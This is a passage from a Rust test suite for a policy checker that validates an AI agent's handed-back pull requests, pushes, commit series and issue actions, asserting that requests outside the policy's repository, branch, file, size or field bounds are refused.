                    .with("aw-o-tool-agent-run-7.patch", Some(patch_of("tool.rs"))),
                &policy,
                "on branch \"agent-run-7\", which is not the run's branch under \"agentic-job/\"",
            ),
            (
                "another run's branch",
                with_item(json!({"branch": "agentic-job/agent-run-8"})),
                &policy,
                "which is not the run's branch",
            ),
            (
                "a branch of its own",
                with_item(json!({"branch": "agentic-job/docs-agent-run-7"})),
                &policy,
                "which is not the run's branch",
            ),
            // Alone, there is no run's own request to compare it with:
            // an earlier run's branch, whose open pull request it would
            // push to, is refused all the same.
            (
                "alone, another run's branch",
                Handback {
                    items: vec![json!({"type": "create_pull_request", "repo": "o/tool",
                        "title": "Fix the tool", "body": "Why.",
                        "branch": "agentic-job/agent-run-8"})],
                    ..both()
                        .with(PATCH_NAME, None)
                        .with(BASE_FILE, None)
                        .with(TOOL_PATCH, None)
                        .with(
                            "aw-o-tool-agentic-job-agent-run-8.patch",
                            Some(patch_of("tool.rs")),
                        )
                },
                &policy,
                "on branch \"agentic-job/agent-run-8\", which is not the run's branch",
            ),
            (
                "without the run's identifier",
                Handback {
                    no_run_id: true,
                    ..both()
                },
                &policy,
                "without the run's identifier to hold its branch to (`check --run-id`)",
            ),
            (
                "its patch, over its budget",
                both().with(TOOL_PATCH, Some(big)),
                &policy,
                "bytes, over 2048",
            ),
            (
                "its patch, of a protected file",
                both().with(TOOL_PATCH, Some(patch_of("go.mod"))),
                &policy,
                "protected",
            ),
            (
                "its patch, under the bounds' protected glob",
                both().with(TOOL_PATCH, Some(patch_of("raw/page.md"))),
                &policy,
                "raw/page.md",
            ),
            (
                "its patch, under .github",
                both().with(TOOL_PATCH, Some(patch_of(".github/x.yml"))),
                &policy,
                "protected",
            ),
            (
                "another base",
                with_item(json!({"base": "dev"})),
                &policy,
                "with base \"dev\", which is not the policy's",
            ),
            (
                "not a draft",
                with_item(json!({"draft": false})),
                &policy,
                "that is not a draft",
            ),
            (
                "its name in another case",
                with_item(json!({"repo": "O/Tool"})),
                &policy,
                "with repo \"O/Tool\", which is not the policy's",
            ),
            (
                "another repository",
                with_item(json!({"repo": "o/other"})),
                &policy,
                "with repo \"o/other\", which is not the policy's",
            ),
            (
                "a base file without its request",
                Handback::pull_request().with(
                    SECONDARY_BASE_FILE,
                    Some(json!({"repo": "o/tool", "ref": "main", "commit": BASE}).to_string()),
                ),
                &policy,
                "secondary-base.json without a create_pull_request for the policy's secondary repository",
            ),
        ];
        for (case, handback, policy, want) in &cases {
            let verdict = handback.check_against(policy);
            assert!(
                verdict.errors.iter().any(|error| error.contains(want)),
                "{case}: {:?}",
                verdict.errors
            );
        }
        // Patches are read within the larger budget, a secondary's here,
        // but the run's own is still held to its own.
        let mut wider = secondary_policy();
        wider.max_patch_bytes = 2048;
        wider
            .secondary_pull_request
            .as_mut()
            .unwrap()
            .max_patch_bytes = 8192;
        let between = format!("{}+{}\n", patch_of("own.rs"), "x".repeat(4096));
        let verdict = both().with(PATCH_NAME, Some(between)).check_against(&wider);
        let over = format!("{PATCH_NAME} is ");
        let refused = |error: &String| error.starts_with(&over) && error.ends_with(", over 2048");
        assert!(verdict.errors.iter().any(refused), "{:?}", verdict.errors);
        // Without a secondary in the policy, the request names another
        // repository like any other.
        let verdict = both().check_against(&crate::policy::tests::policy());
        assert!(
            verdict
                .errors
                .iter()
                .any(|error| error.contains("with repo \"o/tool\", which is not the policy's")),
            "{:?}",
            verdict.errors
        );
    }

    /// Under `ready_when_complete` the check reports the checkpoint that
    /// keeps a pull request a draft, and refuses a malformed one rather
    /// than let apply take it for complete work. Without it, a body's
    /// checkpoint is text like any other.
    #[test]
    fn a_checkpoint_is_reported_where_complete_work_opens_ready() {
        let checkpoint = checkpoint::Checkpoint {
            reason: "budget".into(),
            done: "the parser".into(),
            left: "its tests".into(),
            next: "write the tests".into(),
        };
        let mut ready = policy();
        ready
            .safe_outputs
            .create_pull_request
            .as_mut()
            .unwrap()
            .ready_when_complete = true;
        let with_body = |body: String| {
            let mut handback = Handback::pull_request();
            handback.items[0]["body"] = json!(body);
            handback
        };
        let saved = with_body(format!("Why.\n\n{}", checkpoint.markdown()));
        let malformed = with_body(format!("Why.\n\n{}\n{{}}\n```", checkpoint::FENCE));
        for (name, handback, policy, want) in [
            ("complete", Handback::pull_request(), &ready, Ok(None)),
            ("a checkpoint", saved.clone(), &ready, Ok(Some(&checkpoint))),
            (
                "malformed",
                malformed.clone(),
                &ready,
                Err("create_pull_request's body"),
            ),
            ("not opted in", saved, &policy(), Ok(None)),
            ("malformed, not opted in", malformed, &policy(), Ok(None)),
        ] {
            let verdict = handback.check_against(policy);
            match want {
                Ok(want) => {
                    assert_eq!(verdict.errors, Vec::<String>::new(), "{name}");
                    assert_eq!(verdict.checkpoint.as_ref(), want, "{name}");
                }
                Err(want) => {
                    assert!(
                        verdict.errors.iter().any(|error| error.contains(want)),
                        "{name}: {:?}",
                        verdict.errors
                    );
                }
            }
        }
        let report = serde_json::to_value(Handback::pull_request().check_against(&ready)).unwrap();
        assert!(report.get("checkpoint").is_none());
    }

    /// The policy's commit author reaches the reading of the patch.
    #[test]
    fn a_pinned_author_is_held_to() {
        let mut pinned = policy();
        // The patch is by `agent <agent@localhost>`.
        for author in ["agent <agent@localhost.example>", "Other <o@x.org>"] {
            pinned.commit_author = Some(author.into());
            let verdict = Handback::pull_request().check_against(&pinned);
            assert!(!verdict.ok, "{author}");
            assert!(
                verdict.errors.iter().any(|e| e.contains("commit author")),
                "{author}: {:?}",
                verdict.errors
            );
        }
        let handback = Handback::pull_request().with(
            PATCH_NAME,
            Some(patch_of("src/new.rs").replace("agent <agent@localhost>", "A Bot <a@b.org>")),
        );
        pinned.commit_author = Some("A Bot <a@b.org>".into());
        let verdict = handback.check_against(&pinned);
        assert!(verdict.ok, "{:?}", verdict.errors);
    }

    #[test]
    fn batched_pull_request_closing_references_are_preserved() {
        let body = "Batch sibling work\n\nCloses #64\nCloses #65\nCloses owner/tracker#66";
        let mut handback = Handback::pull_request();
        handback.items[0]["body"] = json!(body);
        let verdict = handback.check();
        assert!(verdict.ok, "{:?}", verdict.errors);
        assert_eq!(verdict.items.len(), 1);
        assert_eq!(verdict.items[0]["body"], body);
        assert!(verdict.patch.is_some());
    }

    /// What apply posts of a link the collector redacted is valid Markdown
    /// naming the host.
    #[test]
    fn redacted_links_are_handed_to_apply_as_text() {
        let mut handback = Handback::pull_request();
        handback.items[0]["body"] = json!("Per [the spec]((src.fedoraproject.org/redacted).");
        let verdict = handback.check();
        assert!(verdict.ok, "{:?}", verdict.errors);
        assert_eq!(
            verdict.items[0]["body"],
            "Per the spec (src.fedoraproject.org/redacted)."
        );

        // Text before a link is not joined to its own.
        let token = format!("gh[p_{}]((e.example/redacted)", "a1B2".repeat(9));
        handback.items[0]["body"] = json!(token);
        let verdict = handback.check();
        assert!(verdict.ok, "{:?}", verdict.errors);
        assert_eq!(verdict.items[0]["body"], token);
    }

    #[test]
    fn what_is_accepted() {
        let cases = [
            ("a pull request", Handback::pull_request(), 1, true),
            (
                "a pull request and a noop",
                Handback {
                    items: vec![pull_request(), noop()],
                    ..Handback::pull_request()
                },
                2,
                true,
            ),
            (
                "a noop alone",
                Handback {
                    items: vec![noop()],
                    ..Handback::default()
                },
                1,
                false,
            ),
            ("nothing", Handback::default(), 0, false),
            (
                "no file at all",
                Handback {
                    no_outputs: true,
                    ..Handback::default()
                },
                0,
                false,
            ),
            // gh-aw's collector reports these incomplete, of its own.
            (
                "nothing, reported incomplete",
                Handback {
                    incomplete: true,
                    ..Handback::default()
                },
                0,
                false,
            ),
            (
                "no file at all, reported incomplete",
                Handback {
                    no_outputs: true,
                    incomplete: true,
                    ..Handback::default()
                },
                0,
                false,
            ),
            (
                "a missing tool, reported incomplete",
                Handback {
                    items: vec![missing_tool()],
                    incomplete: true,
                    ..Handback::default()
                },
                1,
                false,
            ),
        ];
        // The diagnostics a run may be allowed beside its requests.
        let mut policy = policy();
        policy.safe_outputs.others.insert(
            "missing_tool".into(),
            crate::policy::OutputLimit {
                max: 1,
                ..Default::default()
            },
        );
        for (name, handback, items, patch) in cases {
            let verdict = handback.check_against(&policy);
            assert_eq!(verdict.errors, Vec::<String>::new(), "{name}");
            assert!(verdict.ok, "{name}");
            assert_eq!(verdict.items.len(), items, "{name}");
            assert_eq!(verdict.patch.is_some(), patch, "{name}");
        }
        let patch = Handback::pull_request().check().patch.unwrap();
        assert_eq!(
            (patch.file.as_str(), patch.base_commit.as_str()),
            (PATCH_NAME, BASE)
        );
        assert_eq!(patch.bytes, patch_of("src/new.rs").len());
        assert_eq!(patch.files, ["src/new.rs"]);
    }

    /// What `agentic-job publish` would refuse after the session is refused
    /// here, where the agent can still mend it.
    #[test]
    fn native_handlers_refusals() {
        let comment = json!({"type": "add_comment", "body": "Done."});
        let mut policy = Policy {
            native_handlers: vec!["add_comment".into()],
            ..policy()
        };
        policy.safe_outputs.others.insert(
            "add_comment".into(),
            crate::policy::OutputLimit {
                max: 1,
                ..Default::default()
            },
        );
        for (name, items, refused) in [
            (
                "a comment first",
                vec![comment.clone(), pull_request()],
                None,
            ),
            (
                "a comment after gh-aw's request",
                vec![pull_request(), comment.clone()],
                Some("a add_comment after a create_pull_request"),
            ),
            (
                "a comment with a field publish does not publish",
                vec![
                    json!({"type": "add_comment", "body": "Done.", "target": "7"}),
                    pull_request(),
                ],
                Some("the field \"target\""),
            ),
        ] {
            let handback = Handback {
                items,
                ..Handback::pull_request()
            };
            let verdict = handback.check_against(&policy);
            let found = verdict
                .errors
                .iter()
                .any(|e| refused.is_some_and(|r| e.contains(r)));
            assert_eq!(
                (verdict.ok, found),
                (refused.is_none(), refused.is_some()),
                "{name}: {:?}",
                verdict.errors
            );
        }
    }

    /// A run is blocked only when it hands back `missing_data`, with at
    /// most `noop` beside it, and nothing that changes anything.
    #[test]
    fn blocked_is_missing_data_and_nothing_else() {
        let missing_data = || json!({"type": MISSING_DATA, "reason": "Needs #630 merged."});
        let memory = json!({"files": {"notes.md": "Waiting on #630.\n"}}).to_string();
        let mut policy = policy();
        for output in ["missing_tool", MISSING_DATA] {
            policy.safe_outputs.others.insert(
                output.into(),
                crate::policy::OutputLimit {
                    max: 2,
                    ..Default::default()
                },
            );
        }
        policy.memory = Some(memory_rules());
        let only = |items: Vec<Value>| Handback {
            items,
            ..Handback::default()
        };
        // (the case, the hand-back, accepted, blocked)
        let cases = [
            ("missing_data", only(vec![missing_data()]), true, true),
            (
                "missing_data, reported incomplete",
                Handback {
                    incomplete: true,
                    ..only(vec![missing_data()])
                },
                true,
                true,
            ),
            (
                "two missing_data",
                only(vec![missing_data(), missing_data()]),
                true,
                true,
            ),
            (
                "missing_data and noop",
                only(vec![noop(), missing_data()]),
                true,
                true,
            ),
            ("nothing", only(vec![]), true, false),
            ("noop", only(vec![noop()]), true, false),
            ("missing_tool", only(vec![missing_tool()]), true, false),
            (
                "missing_data and missing_tool",
                only(vec![missing_data(), missing_tool()]),
                true,
                false,
            ),
            (
                "missing_data and a pull request",
                Handback {
                    items: vec![pull_request(), missing_data()],
                    ..Handback::pull_request()
                },
                true,
                false,
            ),
            (
                "missing_data and memory",
                only(vec![missing_data()]).with(memory::MEMORY_FILE, Some(memory)),
                true,
                false,
            ),
            (
                "missing_data and a patch, refused",
                only(vec![missing_data()]).with(PATCH_NAME, Some(patch_of("src/new.rs"))),
                false,
                false,
            ),
        ];
        for (name, handback, accepted, blocked) in cases {
            let verdict = handback.check_against(&policy);
            assert_eq!(verdict.ok, accepted, "{name}: {:?}", verdict.errors);
            assert_eq!(verdict.blocked, blocked, "{name}");
            let report = serde_json::to_value(&verdict).unwrap();
            assert_eq!(
                report.get("blocked") == Some(&json!(true)),
                blocked,
                "{name}"
            );
            assert_eq!(
                verdict.markdown(&policy).contains("- blocked: "),
                blocked,
                "{name}"
            );
        }
    }

    /// A push to pull request 42's branch `agent-run-12` at `HEAD`.
    mod push {
        use super::*;
        use crate::policy::tests::{HEAD, push_policy};

        const PUSH_PATCH: &str = "aw-agent-run-12.patch";

        #[test]
        fn checked_replacement_trial_survives_base_branch_advancing() {
            use safe_outputs::apply::replacement::{TrialArgs, git, trial};

            let temp = tempfile::tempdir().unwrap();
            let repo = temp.path().join("repo");
            std::fs::create_dir(&repo).unwrap();
            let run = |args: &[&str]| git(&repo, args).unwrap();
            run(&["init", "-q", "--initial-branch=main"]);
            let commit = |file: &str| {
                std::fs::write(repo.join(file), format!("{file}\n")).unwrap();
                run(&["add", file]);
                run(&[
                    "-c",
                    "user.name=Test",
                    "-c",
                    "user.email=test@example.com",
                    "commit",
                    "-qm",
                    file,
                ]);
                run(&["rev-parse", "HEAD"])
            };
            let older = commit("older.txt");
            let pinned = commit("pinned.txt");
            let base = commit("base.txt");
            run(&["checkout", "-qb", "proposal"]);
            commit("a.txt");
            let first = run(&[
                "format-patch",
                "--stdout",
                "--no-signature",
                "--no-renames",
                "-1",
            ]) + "\n";
            commit("b.txt");
            let second = run(&[
                "format-patch",
                "--stdout",
                "--no-signature",
                "--no-renames",
                "-1",
            ]) + "\n";
            let tree = run(&["rev-parse", "HEAD^{tree}"]);
            let proposal_head = run(&["rev-parse", "HEAD"]);
            run(&["checkout", "-q", "main"]);
            let current = commit("advanced.txt");

            let mut policy = push_policy();
            let config = policy
                .safe_outputs
                .push_to_pull_request_branch
                .as_mut()
                .unwrap();
            config.replacement_max_commits = 2;
            config.replacement_base = Some(pinned.clone());
            let series = json!({"base_commit": base, "commits": [first, second]});
            let verdict = Handback {
                items: vec![push()],
                files: vec![(replacement::REPLACEMENT_FILE, series.to_string())],
                ..Handback::default()
            }
            .check_against(&policy);
            assert!(verdict.ok, "{:?}", verdict.errors);
            let report = temp.path().join("report.json");
            std::fs::write(&report, serde_json::to_vec(&verdict).unwrap()).unwrap();
            let series_file = temp.path().join("replacement.json");
            std::fs::write(&series_file, series.to_string()).unwrap();
            let config_file = temp.path().join("config.json");
            std::fs::write(
                &config_file,
                serde_json::to_vec(&policy.safe_outputs).unwrap(),
            )
            .unwrap();
            let mut args = TrialArgs {
                report,
                series: series_file,
                config: config_file,
                current_base: current.clone(),
                remote: repo.to_str().unwrap().into(),
                temp: temp.path().into(),
            };
            let built = trial(&args, &repo, &crate::apply::read_checked).unwrap();
            assert_eq!(built.tree, tree);
            assert_eq!(
                run(&["rev-list", "--count", &format!("{base}..{}", built.head)]),
                "2"
            );
            // A producer's branch is not an admitted base snapshot.
            args.current_base = pinned.clone();
            let error = trial(&args, &repo, &crate::apply::read_checked).unwrap_err();
            assert!(error.to_string().contains("not an ancestor"), "{error:#}");
            // No claim in the series supplies the trusted current base.
            args.current_base.clear();
            assert!(trial(&args, &repo, &crate::apply::read_checked).is_err());

            args.current_base = current;
            for (claimed, reason) in [
                (older, "does not descend from the policy snapshot"),
                (proposal_head, "not an ancestor of the trusted current base"),
            ] {
                let mut series = series.clone();
                series["base_commit"] = claimed.into();
                let verdict = Handback {
                    items: vec![push()],
                    files: vec![(replacement::REPLACEMENT_FILE, series.to_string())],
                    ..Handback::default()
                }
                .check_against(&policy);
                assert!(verdict.ok, "{:?}", verdict.errors);
                std::fs::write(&args.report, serde_json::to_vec(&verdict).unwrap()).unwrap();
                std::fs::write(&args.series, series.to_string()).unwrap();
                let error = trial(&args, &repo, &crate::apply::read_checked).unwrap_err();
                assert!(error.to_string().contains(reason), "{error:#}");
            }
        }

        #[test]
        fn replacement_series_are_individually_bounded() {
            let mut policy = push_policy();
            let config = policy
                .safe_outputs
                .push_to_pull_request_branch
                .as_mut()
                .unwrap();
            config.replacement_max_commits = 2;
            config.replacement_base = Some(BASE.into());
            let mail =
                |path| patch_of(path).replace(&format!("{BASE_COMMIT_HEADER}: {BASE}\n"), "");
            let series =
                json!({"base_commit": BASE, "commits": [mail("src/a.rs"), mail("src/b.rs")]});
            let proposal = |series: Value| Handback {
                items: vec![push()],
                files: vec![(replacement::REPLACEMENT_FILE, series.to_string())],
                ..Handback::default()
            };
            let verdict = proposal(series.clone()).check_against(&policy);
            assert!(verdict.ok, "{:?}", verdict.errors);
            assert_eq!(verdict.patch.unwrap().commit_files.unwrap().len(), 2);
            let workflow =
                json!({"base_commit": BASE, "commits": [mail(".github/workflows/test.yml")]});
            assert!(!proposal(workflow.clone()).check_against(&policy).ok);
            let mut exempt = policy.clone();
            exempt
                .safe_outputs
                .push_to_pull_request_branch
                .as_mut()
                .unwrap()
                .unprotected_dot_folders = vec![".github".into()];
            assert!(proposal(workflow).check_against(&exempt).ok);
            // A newer base is a claim until trusted apply resolves it.
            assert!(
                proposal(json!({"base_commit": HEAD, "commits": [mail("src/a.rs")]}))
                    .check_against(&policy)
                    .ok
            );
            for invalid in [
                json!({"base_commit": "main", "commits": [mail("src/a.rs")]}),
                json!({"base_commit": "A".repeat(40), "commits": [mail("src/a.rs")]}),
                json!({"base_commit": BASE, "commits": []}),
                json!({"base_commit": BASE, "commits": [mail("src/a.rs"), mail("src/b.rs"), mail("src/c.rs")]}),
                // Forbidden intermediate files cannot hide behind a later revert.
                json!({"base_commit": BASE, "commits": [mail("package.json"), mail("src/a.rs")]}),
                json!({"base_commit": BASE, "commits": [mail("src/a.rs") + &mail("src/b.rs")]}),
                json!({"base_commit": BASE, "commits": [mail("src/a.rs")], "bundle": "ignored?"}),
                json!({"base_commit": BASE, "commits": [mail("src/a.rs").lines().filter(|line| !line.starts_with("Date:")).collect::<Vec<_>>().join("\n") + "\n"]}),
                // `git am` calls a mail without its final newline corrupt.
                json!({"base_commit": BASE, "commits": [mail("src/a.rs").trim_end()]}),
            ] {
                let verdict = proposal(invalid.clone()).check_against(&policy);
                assert!(!verdict.ok, "{invalid}");
            }
            let mut off = policy.clone();
            off.safe_outputs
                .push_to_pull_request_branch
                .as_mut()
                .unwrap()
                .replacement_max_commits = 0;
            assert!(!proposal(series.clone()).check_against(&off).ok);
            let mut small = policy.clone();
            small.max_patch_bytes = 10;
            assert!(!proposal(series.clone()).check_against(&small).ok);
            policy
                .safe_outputs
                .push_to_pull_request_branch
                .as_mut()
                .unwrap()
                .max_patch_files = 1;
            assert!(!proposal(series).check_against(&policy).ok);
        }

        fn push() -> Value {
            json!({"type": PUSH_TO_PULL_REQUEST_BRANCH, "message": "Fix the thing\n\nWhy.", "branch": "agent-run-12"})
        }

        fn handback() -> Handback {
            Handback {
                items: vec![push()],
                files: vec![
                    (PUSH_PATCH, patch_of("src/new.rs").replace(BASE, HEAD)),
                    (
                        BASE_FILE,
                        json!({"repo": "bootc-dev/bootc", "ref": "agent-run-12", "commit": HEAD})
                            .to_string(),
                    ),
                ],
                ..Handback::default()
            }
        }

        /// A push's message holds its checkpoint, as a pull request's body does.
        #[test]
        fn a_push_reports_its_checkpoint() {
            let mut policy = push_policy();
            policy
                .safe_outputs
                .push_to_pull_request_branch
                .as_mut()
                .unwrap()
                .ready_when_complete = true;
            let verdict = handback().check_against(&policy);
            assert_eq!((verdict.errors, verdict.checkpoint), (Vec::new(), None));
            let message = format!(
                "Fix the thing\n\n{}\n{{\"reason\": \"runtime\", \"done\": \"a\", \"left\": \"b\", \"next\": \"c\"}}\n```",
                checkpoint::FENCE
            );
            let verdict = with_item(json!({"message": message})).check_against(&policy);
            assert_eq!(verdict.errors, Vec::<String>::new());
            assert_eq!(verdict.checkpoint.unwrap().reason, "runtime");
        }

        fn with_item(fields: Value) -> Handback {
            let mut item = push();
            for (key, value) in fields.as_object().unwrap() {
                item[key] = value.clone();
            }
            Handback {
                items: vec![item],
                ..handback()
            }
        }

        #[test]
        fn a_push_on_the_pinned_head_is_accepted() {
            let verdict = handback().check_against(&push_policy());
            assert_eq!(verdict.errors, Vec::<String>::new());
            let patch = verdict.patch.unwrap();
            assert_eq!(
                (patch.file.as_str(), patch.base_commit.as_str()),
                (PUSH_PATCH, HEAD)
            );
            let verdict =
                with_item(json!({"pull_request_number": 42})).check_against(&push_policy());
            assert_eq!(verdict.errors, Vec::<String>::new());
            let verdict =
                with_item(json!({"pull_request_number": "42"})).check_against(&push_policy());
            assert_eq!(verdict.errors, Vec::<String>::new());
        }

        #[test]
        fn owned_pushes_use_the_same_dot_folder_rules() {
            let mut policy = push_policy();
            policy
                .safe_outputs
                .push_to_pull_request_branch
                .as_mut()
                .unwrap()
                .unprotected_dot_folders = vec![".github".into()];
            for (path, admitted) in [
                (".github/workflows/test.yml", true),
                (".github/agentic-job/allow.toml", true),
                (".github/CODEOWNERS", false),
                (".github/agentic-job/merge.toml", false),
                (".github/.git/config", false),
                (".husky/hook", false),
            ] {
                let verdict = handback()
                    .with(PUSH_PATCH, Some(patch_of(path).replace(BASE, HEAD)))
                    .check_against(&policy);
                assert_eq!(verdict.ok, admitted, "{path}: {:?}", verdict.errors);
            }
        }

        #[test]
        fn what_is_refused_of_a_push() {
            let stale_base =
                json!({"repo": "bootc-dev/bootc", "ref": "agent-run-12", "commit": BASE})
                    .to_string();
            let cases: Vec<(&str, Handback, &str)> = vec![
                (
                    "another branch",
                    with_item(json!({"branch": "main"})),
                    "a push_to_pull_request_branch with branch \"main\", which is not the policy's",
                ),
                (
                    "another pull request",
                    with_item(json!({"pull_request_number": 43})),
                    "with pull_request_number 43, which is not the policy's pull request",
                ),
                (
                    "another pull request by an alias",
                    with_item(json!({"pr_number": "7"})),
                    "with pr_number \"7\", which is not the policy's pull request",
                ),
                (
                    "another repository",
                    with_item(json!({"repo": "evil/bootc"})),
                    "with repo \"evil/bootc\", which is not the policy's",
                ),
                (
                    "a head that moved since the run was asked for",
                    handback()
                        .with(BASE_FILE, Some(stale_base))
                        .with(PUSH_PATCH, Some(patch_of("src/new.rs"))),
                    "the pull request's head the run was asked for",
                ),
                (
                    "a patch on another commit than base.json's",
                    handback().with(PUSH_PATCH, Some(patch_of("src/new.rs"))),
                    "aw-agent-run-12.patch: ",
                ),
                (
                    "a patch to a workflow",
                    handback().with(
                        PUSH_PATCH,
                        Some(patch_of(".github/workflows/ci.yml").replace(BASE, HEAD)),
                    ),
                    "protected files: .github/workflows/ci.yml",
                ),
                (
                    "a pull request instead",
                    Handback {
                        items: vec![pull_request()],
                        ..handback()
                    },
                    "an output of type \"create_pull_request\", which the policy does not allow",
                ),
                (
                    "a patch without the push",
                    Handback {
                        items: vec![noop()],
                        ..handback()
                    },
                    "a patch without a push_to_pull_request_branch",
                ),
                (
                    "a push without its patch",
                    handback().with(PUSH_PATCH, None),
                    "push_to_pull_request_branch needs exactly one patch, aw-agent-run-12.patch; there is none",
                ),
                (
                    "two pushes",
                    Handback {
                        items: vec![push(), push()],
                        ..handback()
                    },
                    "2 outputs of type \"push_to_pull_request_branch\", over 1",
                ),
            ];
            for (name, handback, want) in cases {
                let verdict = handback.check_against(&push_policy());
                assert!(!verdict.ok, "{name}");
                assert!(
                    verdict.errors.iter().any(|error| error.contains(want)),
                    "{name}: {:?}",
                    verdict.errors
                );
            }
            // And a push where the policy opens pull requests.
            let verdict = handback().check();
            assert!(
                verdict
                    .errors
                    .iter()
                    .any(|error| error.contains("which the policy does not allow")),
                "{:?}",
                verdict.errors
            );
        }
    }

    /// An issue that names other issues is refused by this rule, and one
    /// that does not passes it.
    #[test]
    fn an_issue_that_links_other_issues_is_refused() {
        let policy = policy();
        let plain = json!({"type": "create_issue", "title": "t", "body": "b"});
        assert!(redirections(plain.as_object().unwrap(), &policy).is_empty());
        for key in ISSUE_LINKS {
            let mut item = plain.clone();
            item[*key] = json!(7);
            assert_eq!(
                redirections(item.as_object().unwrap(), &policy),
                [format!(
                    "a create_issue with {key}, which links another issue"
                )],
                "{key}"
            );
        }
    }

    #[test]
    fn bounded_issue_actions() {
        for (output, number_key, field) in [
            ("close_issue", "issue_number", "body"),
            ("add_labels", "item_number", "labels"),
            ("remove_labels", "item_number", "labels"),
            ("update_issue", "issue_number", "body"),
            ("update_pull_request", "pull_request_number", "title"),
            (MARK_READY, "pull_request_number", "reason"),
        ] {
            let mut policy = policy();
            let labels = matches!(output, "add_labels" | "remove_labels");
            policy.safe_outputs.others.insert(
                output.to_owned(),
                crate::policy::OutputLimit {
                    max: 1,
                    allowed: labels.then(|| vec!["triage".to_owned()]),
                    fields: update_fields(output).map_or_else(Vec::new, |_| vec![field.to_owned()]),
                    ..Default::default()
                },
            );
            let mut plain = json!({"type": output, "repo": policy.repo});
            plain[field] = if field == "labels" {
                json!(["triage"])
            } else {
                json!("text")
            };
            plain[number_key] = json!(7);
            for (key, value, ok) in [
                (number_key, json!(7), true),
                (number_key, json!(0), false),
                (number_key, json!("7"), false),
                (number_key, Value::Null, false),
                ("repo", json!("other/repo"), false),
                ("repo", Value::Null, false),
                ("target", json!("*"), false),
                ("pr_number", json!(8), false),
                ("item_number", json!(7), number_key == "item_number"),
                ("duplicate_of", json!("other/repo#8"), false),
            ] {
                let mut item = plain.clone();
                item[key] = value;
                assert_eq!(
                    redirections(item.as_object().unwrap(), &policy).is_empty(),
                    ok,
                    "{output} {key}: {item}"
                );
            }
            if labels {
                for labels in [json!(["release"]), json!([{"name": "triage"}])] {
                    let mut item = plain.clone();
                    item["labels"] = labels;
                    assert!(!redirections(item.as_object().unwrap(), &policy).is_empty());
                }
            }
            if output == "remove_labels" {
                for labels in [
                    None,
                    Some(Value::Null),
                    Some(json!("triage")),
                    Some(json!([])),
                ] {
                    let mut item = plain.clone();
                    item.as_object_mut().unwrap().remove("labels");
                    if let Some(labels) = labels {
                        item["labels"] = labels;
                    }
                    assert!(!redirections(item.as_object().unwrap(), &policy).is_empty());
                }
                let limit = policy.safe_outputs.others.get_mut(output).unwrap();
                limit.allowed = Some(vec![]);
                assert!(!redirections(plain.as_object().unwrap(), &policy).is_empty());
                policy.safe_outputs.others.get_mut(output).unwrap().allowed =
                    Some(vec!["triage".to_owned()]);
            }
            let dir = tempfile::tempdir().unwrap();
            let out = dir.path().join("out");
            std::fs::create_dir(&out).unwrap();
            std::fs::write(out.join(OUTPUTS_FILE), format!("{plain}\n")).unwrap();
            let collected = dir.path().join("collected.json");
            for count in [1, 2] {
                std::fs::write(
                    &collected,
                    json!({"items": vec![plain.clone(); count], "errors": []}).to_string(),
                )
                .unwrap();
                assert_eq!(
                    check_outputs(&out, &collected, &policy).unwrap().ok,
                    count == 1,
                    "{output}: {count}"
                );
            }
        }
    }

    #[test]
    fn updates_change_only_the_fields_the_policy_lists() {
        for (output, listed, item, ok) in [
            ("update_issue", &["body"][..], json!({"body": "b"}), true),
            (
                "update_issue",
                &["body"],
                json!({"body": "b", "operation": "replace-island"}),
                true,
            ),
            ("update_issue", &["body"], json!({"title": "t"}), false),
            (
                "update_issue",
                &["body"],
                json!({"status": "closed"}),
                false,
            ),
            (
                "update_issue",
                &["title", "status"],
                json!({"title": "t", "status": "closed"}),
                true,
            ),
            (
                "update_issue",
                &["title"],
                json!({"title": "t", "operation": "append"}),
                false,
            ),
            // Not listable: they would pass label and assignee bounds by.
            (
                "update_issue",
                &["body"],
                json!({"body": "b", "labels": ["x"]}),
                false,
            ),
            (
                "update_issue",
                &["body"],
                json!({"body": "b", "assignees": ["x"]}),
                false,
            ),
            (
                "update_issue",
                &["body"],
                json!({"body": "b", "milestone": 1}),
                false,
            ),
            (
                "update_pull_request",
                &["title", "body"],
                json!({"title": "t", "body": "b"}),
                true,
            ),
            (
                "update_pull_request",
                &["title"],
                json!({"body": "b"}),
                false,
            ),
            // Out of draft only where the bounds list `draft`.
            (
                "update_pull_request",
                &["title"],
                json!({"title": "t", "draft": false}),
                false,
            ),
            (
                "update_pull_request",
                &["title"],
                json!({"title": "t", "draft": true}),
                false,
            ),
            (
                "update_pull_request",
                &["title", "draft"],
                json!({"draft": false}),
                true,
            ),
            (
                "update_pull_request",
                &["title"],
                json!({"title": "t", "update_branch": true}),
                false,
            ),
            (
                "update_pull_request",
                &["update_branch"],
                json!({"update_branch": true}),
                true,
            ),
            (
                "update_pull_request",
                &["title"],
                json!({"title": "t", "state": "closed"}),
                false,
            ),
            (
                "update_pull_request",
                &["title"],
                json!({"title": "t", "base": "other"}),
                false,
            ),
            (
                "update_pull_request",
                &["title"],
                json!({"title": "t", "pr": 7}),
                false,
            ),
            (MARK_READY, &[], json!({"reason": "r"}), true),
            (MARK_READY, &[], json!({"reason": "r", "body": "b"}), false),
            (
                MARK_READY,
                &[],
                json!({"reason": "r", "draft": false}),
                false,
            ),
        ] {
            let mut policy = policy();
            policy.safe_outputs.others.insert(
                output.to_owned(),
                crate::policy::OutputLimit {
                    max: 1,
                    fields: listed.iter().map(|field| (*field).to_owned()).collect(),
                    ..Default::default()
                },
            );
            let mut item = item.clone();
            item["type"] = json!(output);
            item["repo"] = json!(policy.repo);
            item[target_key(output).unwrap()] = json!(7);
            assert_eq!(
                redirections(item.as_object().unwrap(), &policy).is_empty(),
                ok,
                "{listed:?}: {item}"
            );
        }
        // A type the policy does not list allows nothing, mark-ready included.
        for output in ["update_issue", "update_pull_request", MARK_READY] {
            let item = json!({"type": output, "repo": policy().repo, "title": "t", "reason": "r"});
            assert!(!redirections(item.as_object().unwrap(), &policy()).is_empty());
        }
    }

    #[test]
    fn person_actions_name_only_allowed_logins() {
        for (output, number_key, people, alias) in [
            (
                "add_reviewer",
                "pull_request_number",
                "reviewers",
                "team_reviewers",
            ),
            ("assign_to_user", "issue_number", "assignees", "assignee"),
        ] {
            let mut policy = policy();
            policy.safe_outputs.others.insert(
                output.to_owned(),
                crate::policy::OutputLimit {
                    max: 2,
                    allowed: Some(vec!["octocat".to_owned(), "hubot".to_owned()]),
                    ..Default::default()
                },
            );
            let mut plain = json!({"type": output, "repo": policy.repo});
            plain[number_key] = json!(7);
            plain[people] = json!(["octocat"]);
            for (key, value, ok) in [
                (number_key, json!(7), true),
                (people, json!(["octocat", "hubot"]), true),
